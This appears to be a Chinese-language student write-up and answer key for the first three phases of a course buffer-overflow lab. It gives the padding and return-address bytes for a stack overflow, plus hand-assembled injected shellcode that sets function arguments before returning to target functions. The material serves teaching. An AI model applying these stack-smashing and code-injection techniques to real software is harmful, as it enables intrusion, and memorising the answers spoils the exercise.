phase1:
第一个很简单输入函数开辟了0x28的空间用于保存输入,返回地址在rsp+0x28的位置,所以输入一段0x28字节的字符串后面跟上返回touch1的地址,注意地址是小端存放:C0 17 40,

答案:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 01 02 00 00
c0 17 40


phase2:
第二个需要注入可执行代码,需要把touch2的参数寄存器rdi内容设置位cookie,这样重置ret到touch是才能正确执行,所有第一次在getbuf中把返回值重置为一个栈地址,然后在这个地址内写入一系列操作,每次ret后返回地址会自动退栈,所以先把rsp-8,然后先把rdi写入touch的地址,然后将rdi写入rsp指向栈地址中,然后把cookie值写入rdi中,最后ret.

答案:
48 83 ec 08           /*  sub    $0x8,%rsp */
48 c7 c7 ec 17 40 00  /*  mov    $0x4017ec,%rdi */
48 89 3c 24           /*  mov    %rdi,(%rsp) */
48 c7 c7 fa 97 b9 59  /*  mov    $0x59b997fa,%rdi   -   set cookie */
c3                    /*  retq  */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00
78 dc 61 55 /* return adress, execute exploit code */

phase3:
第三题和第二题基本相同return到touch3后要进行一次cookie对比,第二题是十六进制的数字对比,可以提前把cookie写入rdi寄存器里,但是第三题的参数是一个字符串指针,所以要把字符串地址写入rsi第二个参数寄存器里,不能用在栈中写,因为后面还有两次函数调用,栈空间很容易被覆盖,找了一下变量cookie的地址,这个地址0x6044e4的后面有很长一段地址没有使用过,所以可以把字符串写入0x6044ec,rsi的参数传递在0x6044ec,还有一个地方是字符串"59b997fa",每个字符存在一个字节里,一共需要8个字节的空间,可以用mov,写入0x十六进制数,但是要注意字符串大端存放,数字是小端存放,翻转一下就可以了.

答案:
48 83 ec 08           /*  sub    $0x8,%rsp */
bf fa 18 40 00        /*  mov    $0x4018fa,%edi */
48 89 3c 24           /*  mov    %rdi,(%rsp) */
bf ec 44 60 00        /*  mov    $0x6044ec,%edi  */
48 be 35 39 62 39 39  /*  movabs $0x6166373939623935,%rsi */
37 66 61
48 89 37              /*  mov    %rsi,(%rdi)    */
c3                    /*  retq  */
00 00 00 00 00 00 00
00
78 dc 61 55 /* return adress, execute exploit code */


